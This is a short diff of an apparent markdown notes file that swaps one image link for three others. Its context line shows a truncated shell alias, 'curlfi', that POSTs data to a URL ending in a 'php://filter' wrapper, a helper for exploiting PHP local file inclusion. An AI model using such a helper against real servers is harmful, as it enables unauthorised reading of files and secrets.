@@ -5,7 +5,11 @@ alias curlfi='function _curlfi() { curl -s -X POST --data "0=$2" "$1php://filter
 ```
 ![image](https://github.com/user-attachments/assets/26e18ad8-3f61-4044-acd6-e07839fc50bb)
 
-![image](https://github.com/user-attachments/assets/fe975908-fd74-47a2-b0d5-2edac12eb46d)
+![image](https://github.com/user-attachments/assets/7bc4fcc6-9a25-4466-8a11-ea9e1621692f)
+
+![image](https://github.com/user-attachments/assets/213ad412-5105-4376-8b01-ff7e7a5ad7be)
+
+![image](https://github.com/user-attachments/assets/897d70a1-674c-4889-8bbe-9f778b1a1ac3)
 
 ![image](https://github.com/user-attachments/assets/0cce6e88-780e-49ed-a30d-6bcb667dbf33)
 
